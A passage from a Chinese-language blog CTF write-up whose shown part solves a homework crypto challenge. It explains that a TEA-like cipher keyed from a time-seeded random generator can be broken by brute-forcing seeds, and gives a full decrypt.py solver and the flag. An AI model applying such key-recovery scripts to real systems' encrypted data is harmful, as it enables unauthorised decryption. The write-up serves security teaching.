class="number">0xFACEB00C</span>, <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> 次數 <span class="keyword">in</span> 範圍(<span class="number">32</span>):</span><br><span class="line">        累加 = 累加 + 得優塔 &amp; 遮罩</span><br><span class="line">        向量[<span class="number">0</span>] = 向量[<span class="number">0</span>] + ((向量[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + 金鑰[<span class="number">0</span>] &amp; 遮罩 ^ (向量[<span class="number">1</span>] + 累加) &amp; 遮罩 ^ (向量[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + 金鑰[<span class="number">1</span>] &amp; 遮罩) &amp; 遮罩</span><br><span class="line">        向量[<span class="number">1</span>] = 向量[<span class="number">1</span>] + ((向量[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) + 金鑰[<span class="number">2</span>] &amp; 遮罩 ^ (向量[<span class="number">0</span>] + 累加) &amp; 遮罩 ^ (向量[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) + 金鑰[<span class="number">3</span>] &amp; 遮罩) &amp; 遮罩</span><br><span class="line">    <span class="keyword">return</span> 向量</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 加密<span class="params">(明文: 位元組, 密鑰: 位元組)</span>:</span></span><br><span class="line">    密文 = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> 索引 <span class="keyword">in</span> 範圍(<span class="number">0</span>, 長度(明文), <span class="number">8</span>):</span><br><span class="line">        密文 += 逆轉換(_加密(正轉換(明文[索引:索引+<span class="number">8</span>]), 正轉換(密鑰)))</span><br><span class="line">    <span class="keyword">return</span> 密文</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    旗幟 = 打開(<span class="string">'旗幟'</span>, 讀取位元組).讀取()</span><br><span class="line">    <span class="keyword">assert</span> 長度(旗幟) == <span class="number">16</span></span><br><span class="line">    隨機.種子(整數(時間.現在()))</span><br><span class="line">    密鑰 = 隨機.給我隨機位元們(<span class="number">128</span>).到位元組(<span class="number">16</span>, 大端序)</span><br><span class="line">    密文 = 加密(旗幟, 密鑰)</span><br><span class="line">    列印(<span class="string">f'密文 = <span class="subst">&#123;密文.十六進制()&#125;</span>'</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h2><p>但我們可以注意到，這程式的<code>密鑰</code>是將時間做為 random seed 所隨機出來的 128 bits，那我們就可以把 key space 縮小到我們可以 brute force 出來的大小，至少知道這個時間點是在 python3 被發行到你現在的這個瞬間</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">隨機.種子(整數(時間.現在()))</span><br><span class="line">密鑰 = 隨機.給我隨機位元們(<span class="number">128</span>).到位元組(<span class="number">16</span>, 大端序)</span><br></pre></td></tr></table></figure>
+
+<p>也就是我們只要枚舉從現在開始往前的每秒作為 random seed 直接解密看看就好了，因為是以 8 byte 為一個單位解密，我們先解前面 8 byte 看有沒有 flag prefix 會快一點。注意的是因為我們在逆轉加密 aka 解密，<code>累加</code>要換成<code>0xfaceb00c*32&amp;0xffffffff</code>，操作也都是反轉，掉書袋一下，就 <a href="https://en.wikipedia.org/wiki/Feistel_cipher" target="_blank" rel="noopener">Feistel</a>，看著圖比較好理解為啥要逆轉：</p>
+<figure class="highlight py"><figcaption><span>decrypt.py </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> 時間</span><br><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> 隨機</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List <span class="keyword">as</span> 陣列</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BufferedReader <span class="keyword">as</span> 緩衝讀取者</span><br><span class="line"><span class="keyword">from</span> forbiddenfruit <span class="keyword">import</span> curse <span class="keyword">as</span> 詛咒</span><br><span class="line"></span><br><span class="line">整數 = int</span><br><span class="line">詛咒(整數, <span class="string">"從位元組"</span>, 整數.from_bytes)</span><br><span class="line">詛咒(整數, <span class="string">"到位元組"</span>, 整數.to_bytes)</span><br><span class="line">位元組 = bytes</span><br><span class="line">詛咒(位元組, <span class="string">"十六進制"</span>, 位元組.hex)</span><br><span class="line">詛咒(位元組, <span class="string">"加入"</span>, 位元組.join)</span><br><span class="line">詛咒(緩衝讀取者, <span class="string">"讀取"</span>, 緩衝讀取者.read)</span><br><span class="line">隨機.種子 = 隨機.seed</span><br><span class="line">隨機.給我隨機位元們 = 隨機.getrandbits</span><br><span class="line">時間.現在 = 時間.time</span><br><span class="line">列印 = <span class="keyword">print</span></span><br><span class="line">打開 = open</span><br><span class="line">範圍 = range</span><br><span class="line">長度 = len</span><br><span class="line">大端序 = <span class="string">'big'</span></span><br><span class="line">讀取位元組 = <span class="string">'rb'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 正轉換<span class="params">(資料, 大小=<span class="number">4</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [整數.從位元組(資料[索引:索引+大小], 大端序) <span class="keyword">for</span> 索引 <span class="keyword">in</span> 範圍(<span class="number">0</span>, 長度(資料), 大小)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 逆轉換<span class="params">(資料, 大小=<span class="number">4</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b''</span>.加入([元素.到位元組(大小, 大端序) <span class="keyword">for</span> 元素 <span class="keyword">in</span> 資料])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_</span>解密<span class="params">(向量: 陣列[整數], 金鑰: 陣列[整數])</span>:</span></span><br><span class="line">    累加, 得優塔, 遮罩 = <span class="number">0x59d60180</span>, <span class="number">0xFACEB00C</span>, <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> 次數 <span class="keyword">in</span> 範圍(<span class="number">32</span>):</span><br><span class="line">        向量[<span class="number">1</span>] = 向量[<span class="number">1</span>] - ((向量[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) + 金鑰[<span class="number">2</span>] &amp; 遮罩 ^ (向量[<span class="number">0</span>] + 累加) &amp; 遮罩 ^ (向量[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) + 金鑰[<span class="number">3</span>] &amp; 遮罩) &amp; 遮罩</span><br><span class="line">        向量[<span class="number">0</span>] = 向量[<span class="number">0</span>] - ((向量[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + 金鑰[<span class="number">0</span>] &amp; 遮罩 ^ (向量[<span class="number">1</span>] + 累加) &amp; 遮罩 ^ (向量[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + 金鑰[<span class="number">1</span>] &amp; 遮罩) &amp; 遮罩</span><br><span class="line">        累加 = 累加 - 得優塔 &amp; 遮罩</span><br><span class="line">    <span class="keyword">return</span> 向量</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 解密<span class="params">(明文: 位元組, 密鑰: 位元組)</span>:</span></span><br><span class="line">    密文 = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> 索引 <span class="keyword">in</span> 範圍(<span class="number">0</span>, 長度(明文), <span class="number">8</span>):</span><br><span class="line">        密文 += 逆轉換(_解密(正轉換(明文[索引:索引+<span class="number">8</span>]), 正轉換(密鑰)))</span><br><span class="line">    <span class="keyword">return</span> 密文</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    cipher = bytes.fromhex(<span class="string">'77f905c39e36b5eb0deecbb4eb08e8cb'</span>)</span><br><span class="line">    now = int(時間.time()) - <span class="number">86400</span>*<span class="number">2</span></span><br><span class="line">    subcipher = cipher[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">while</span> now &gt; <span class="number">0</span>:</span><br><span class="line">        now -= <span class="number">1</span></span><br><span class="line">        隨機.種子(now)</span><br><span class="line">        密鑰 = 隨機.給我隨機位元們(<span class="number">128</span>).到位元組(<span class="number">16</span>, 大端序)</span><br><span class="line">        plain = 解密(subcipher, 密鑰)</span><br><span class="line">        <span class="keyword">if</span> plain.startswith((<span class="string">b'flag'</span>,<span class="string">b'FLAG'</span>)):</span><br><span class="line">            print(解密(cipher, 密鑰))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>然後就可以拿到 flag 了</p>
+<p>flag: <code>FLAG{4lq7mWGh93}</code></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Original Author: <a href="http://blog.terrynini.tw">Terrynini</a>
+            <p>Original link: <a href="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/">http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/</a>
+            <p>Publish at: <a href="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/">September 25th 2020, 9:00:00</a>
+            <p>Copyright: This article is licensed under <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/tw/2020-Flare-On-7-Write-up/" title= "2020::Flare-On 7::Write-up">
+                    <div class="nextTitle">2020::Flare-On 7::Write-up</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/" title= "2020::AIS3::前測官方解">
+                    <div class="prevTitle">2020::AIS3::前測官方解</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    
+    <div id="disqus_thread"></div>
+    <script>
+        /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        
+        var disqus_config = function () {
+        this.page.url = "http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "2020::程式安全::HW0 Write-up"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        
+        (function () { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://terrynini.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
+
+
+    </style>
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- mermaid-->
+    
+      <script src="https://unpkg.com/mermaid@8.4.6/dist/mermaid.min.js"></script>
+      <script>mermaid.initialize({startOnLoad:true});</script>
+      
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:terrynini38514@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/terrynini" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//www.facebook.com/profile.php?id=100001963625238" class="iconfont-archer facebook" target="_blank" title=facebook></a>
+            
+        
+    
+        
+            
+                <a href="//twitter.com/terrynini38514" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//www.linkedin.com/in/%E5%BB%B7%E5%AE%87-%E9%99%B3-bb1b21140/" class="iconfont-archer linkedin" target="_blank" title=linkedin></a>
+            
+        
+    
+        
+            
+                <a href="https://speakerdeck.com/terrynini" class="iconfont-archer others" target="_blank" title=others></a>
+            
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Eekum-Bokum"><span class="toc-number">1.</span> <span class="toc-text">Eekum Bokum</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-or-just-move"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit (or just move)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#owoHub"><span class="toc-number">2.</span> <span class="toc-text">owoHub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CafeOverflow"><span class="toc-number">3.</span> <span class="toc-text">CafeOverflow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-2"><span class="toc-number">3.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-1"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-Floating-Aquamarine"><span class="toc-number">4.</span> <span class="toc-text">The Floating Aquamarine</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-3"><span class="toc-number">4.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-2"><span class="toc-number">4.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#解密一下"><span class="toc-number">5.</span> <span class="toc-text">解密一下</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-4"><span class="toc-number">5.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-3"><span class="toc-number">5.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 38
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2022 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/en/2022-BalsnCTF-ProjectO-Write-up/" >2022::BalsnCTF::ProjectO Write-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href= "/en/2021-Flare-On-8-Write-up/" >2021::Flare-On 8::Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/en/2021-QEMU-AFL-and-TCG/" >2021::QEMU::AFL++ and TCG</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/17</span><a class="archive-post-title" href= "/tw/2021-OSCP-%E5%9B%9E%E9%A1%A7%E8%88%87%E5%88%86%E4%BA%AB/" >2021::OSCP::回顧與分享</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/22</span><a class="archive-post-title" href= "/tw/2020-Flare-On-7-Write-up/" >2020::Flare-On 7::Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/" >2020::程式安全::HW0 Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/29</span><a class="archive-post-title" href= "/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/" >2020::AIS3::前測官方解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/28</span><a class="archive-post-title" href= "/tw/TIL-AVX-Base64/" >TIL::AVX Base64</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW4-Write-up/" >程式安全::HW4 Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href= "/en/2019-Flare-On-6-Record/" >2019::Flare-On 6::Record</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href= "/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW3-Write-up/" >程式安全::HW3 Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/tw/TIL-Windows-Services-Debug/" >TIL::Windows Services Debug</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/tw/2019-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/" >2019::AIS3::前測官方解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/01</span><a class="archive-post-title" href= "/en/2019-PlaidCTF/" >2019::PlaidCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/tw/TIL-%E6%94%BB%E6%93%8ALCG-%E7%B7%9A%E6%80%A7%E5%90%8C%E9%A4%98%E7%94%9F%E6%88%90%E5%99%A8/" >TIL::攻擊LCG(線性同餘生成器)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href= "/en/2019-0CTF-Quals-Sanitize/" >2019::0CTF::Quals::Sanitize</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href= "/tw/TIL-%E5%88%A9%E7%94%A8-Chakra-JIT-%E7%B9%9E%E9%81%8E-DEP-%E5%92%8C-CFG/" >TIL::利用 Chakra JIT 繞過 DEP 和 CFG</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href= "/en/2019-CONFidence/" >2019::CONFidence</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/tw/TIL-FaceBook-GIF-memory-exposure/" >TIL::FaceBook_GIF_memory_exposure</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/en/2019-PragyanCTF/" >2019::PragyanCTF</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/tw/2018-Reversing-KR-Record/" >2018::Reversing.KR::Record</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/en/2018-RealWorldCTF-Qual/" >2018::RealWorldCTF::Qual</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/13</span><a class="archive-post-title" href= "/tw/2018-AIS3-pre-exam/" >2018::AIS3::pre-exam</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/tw/OS-NachOS-HW1/" >OS::NachOS::HW1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/04</span><a class="archive-post-title" href= "/en/2018-ASIS-Quals-reverse/" >2018::ASIS-Quals::reverse</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/02</span><a class="archive-post-title" href= "/en/2018-0CTF-Quals-g0g0g0/" >2018::0CTF-Quals::g0g0g0</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework5/" >Advance-Algorithm::homework5</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework6/" >Advance-Algorithm::homework6</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework7/" >Advance-Algorithm::homework7</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework4/" >Advance-Algorithm::homework4</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/en/2017-SECCON-Write-up/" >2017::SECCON::Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/en/Advance-Algorithm-homework3/" >Advance-Algorithm::homework3</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/en/Advance-Algorithm-homework2/" >Advance-Algorithm::homework2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/13</span><a class="archive-post-title" href= "/en/Advance-Algorithm-homework1/" >Advance-Algorithm::homework1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/en/2017-HITCON-Quals-Sakura-English/" >2017::HITCON-Quals::Sakura::English</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/tw/2017-HITCON-qual-Sakura/" >2017::HITCON-qual::Sakura</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/tw/Reversing-kr-write-up-1/" >Reversing.kr #1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href= "/tw/2017-AIS3-pre-exam-write-up/" >AIS3 pre-exam write up</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Reverse"><span class="iconfont-archer">&#xe606;</span>Reverse</span>
+    
+        <span class="sidebar-tag-name" data-tags="HITCON"><span class="iconfont-archer">&#xe606;</span>HITCON</span>
+    
+        <span class="sidebar-tag-name" data-tags="SECCON"><span class="iconfont-archer">&#xe606;</span>SECCON</span>
+    
